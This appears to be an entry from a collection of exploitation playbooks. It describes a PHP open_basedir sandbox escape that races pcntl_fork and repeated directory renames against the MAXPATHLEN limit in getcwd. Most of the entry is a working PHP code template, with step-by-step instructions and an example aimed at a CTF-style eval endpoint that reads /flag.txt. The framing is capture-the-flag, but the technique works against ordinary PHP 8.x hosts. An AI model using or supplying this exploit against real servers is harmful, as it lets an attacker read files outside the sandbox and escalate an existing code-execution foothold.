---
name: php_open_basedir_race_pcntl_fork
vuln_type: lfi
sub_technique: open_basedir_bypass
category: exploitation
safety_level: safe
tags:
- php
- open-basedir
- race-condition
- pcntl-fork
- lfi
- sandbox-escape
---

# Php Open Basedir Bypass — Pcntl Fork + Rename Race On Getcwd/Maxpathlen

## When to Apply

PHP 8.x environment where `open_basedir` is restricted to `/tmp` etc., `pcntl_fork` is not in `disable_functions` (pcntl extension enabled), and arbitrary PHP code execution is possible (eval gate, webshell, file upload, etc.). Even if command execution functions (system/exec/popen) are blocked, `file_get_contents` can read files outside open_basedir like `/flag.txt`.

## Prerequisites

- Arbitrary PHP code execution possible (eval, include, etc.)
- pcntl_fork() is not in disable_functions
- open_basedir includes /tmp (mkdir/rename must be available)
- ini_set('open_basedir', ...) callable (not set via php_admin_value)

## Steps

1. `chdir('/tmp')` → `mkdir('start/')` → `chdir('start/')`
2. Create deep directory with `str_repeat('a' * 249 . '/', N)` so the path length is just below 4096 (MAXPATHLEN), then `chdir` into it
3. `pcntl_fork()` — split into child and parent
4. **Child**: repeatedly attempts `ini_set('open_basedir', $cur . ':../')`. When parent renames the path to exceed 4096, `getcwd()` fails → `expand_filepath('../')` falls back to `VCWD_OPEN('../')` → returns `../` as-is → successfully adds `../` to open_basedir
5. **Parent**: renames `/tmp/start` to `/tmp/xxxxxx...(250 chars)` and back repeatedly (toggles path length across the 4096 boundary)
6. Child: after race succeeds, `chdir('/tmp'); chdir('../')` → escapes open_basedir
7. `file_get_contents('/flag.txt')` to read the flag

## Code Template

```
chdir('/tmp');
@mkdir('start/');
chdir('start/');
$cur_dir_len = strlen(getcwd());
$depth = str_repeat(str_repeat('a', 249).'/', 16 - floor($cur_dir_len / 250));
@mkdir($depth, 0755, true);
chdir($depth);
$pid = pcntl_fork();
if($pid == 0) {
  for ($i=0; $i<25; $i++) {
    usleep(300);
    ini_set('open_basedir', ini_get('open_basedir').':../');
  }
  chdir('/tmp'); chdir('../');
  echo file_get_contents('{flag_path}');
} else {
  chdir('/tmp');
  for ($i=0; $i<30000; $i++) {
    usleep(30);
    @rename('start', str_repeat('x', 250));
    @rename(str_repeat('x', 250), 'start');
  }
}
```

## Examples

### Example 1

- **open_basedir**: /var/www/html:/tmp
- **disabled_functions**: system,exec,shell_exec,popen,proc_open,passthru,... (pcntl_fork excluded)
- **flag_path**: /flag.txt
- **eval_gate**: ?key=KEY&code=<php_code>
- **race_success_rate**: high success rate on first attempt

Targets PHP 8.4-cli. Bug in expand_filepath(): VCWD_GETCWD → getcwd() fails when exceeding MAXPATHLEN(4096), fallback VCWD_OPEN(filepath) succeeds and returns filepath as realpath as-is. Triggered via race condition.
